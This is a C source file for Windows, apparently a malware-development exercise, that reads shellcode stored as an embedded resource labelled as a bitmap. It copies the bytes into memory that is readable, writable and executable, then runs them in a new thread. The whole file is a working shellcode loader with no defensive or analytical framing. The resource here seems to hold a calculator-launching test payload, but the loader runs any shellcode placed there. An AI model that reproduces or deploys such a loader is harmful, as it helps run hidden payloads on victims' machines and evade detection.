#include "Windows.h"
#include "stdio.h"
#include "3-shellcode-variation-resource.h"

int main()
{
	HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(CALC_BIN_BMP), RT_RCDATA);
	HGLOBAL hResource = LoadResource(NULL, resource);
	unsigned char* payload = (unsigned char*)LockResource(hResource);
	int payload_len = SizeofResource(NULL, resource);

	printf("[*] Payload address 0x%-016p", (void*)payload);
	printf("[*] Size of payload is %d.\n", payload_len);

	LPVOID  address = (LPVOID)VirtualAlloc(0, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (address == 0) {
		printf("[*] Error allocating memory. Error: %d.\n", GetLastError());
		return -1;
	}
	printf("[*] Allocated memory in process.\n");

	SIZE_T bytes = 0;
	SIZE_T* bytes_written = &bytes;

	RtlMoveMemory(address, payload, payload_len);


	DWORD thread_id;
	DWORD* pthreadId = &thread_id;

	HANDLE hRemoteThread = CreateThread(
		NULL, //lpthreadattributes
		(SIZE_T)1024, //dwstacksize
		(LPTHREAD_START_ROUTINE)address, //lpstartaddress
		NULL, //lpvoid lpparameter
		0,
		pthreadId
	);
	if (hRemoteThread == 0) {
		printf("[*] Error creating remote thread. Error: %d.\n", GetLastError());
		return -1;
	}
	printf("[*] New thread started.\n");
	printf("New thread ID is %d.\n", thread_id);

	//Sleep(1000);
	WaitForSingleObject(hRemoteThread, INFINITE);
	return 0;
}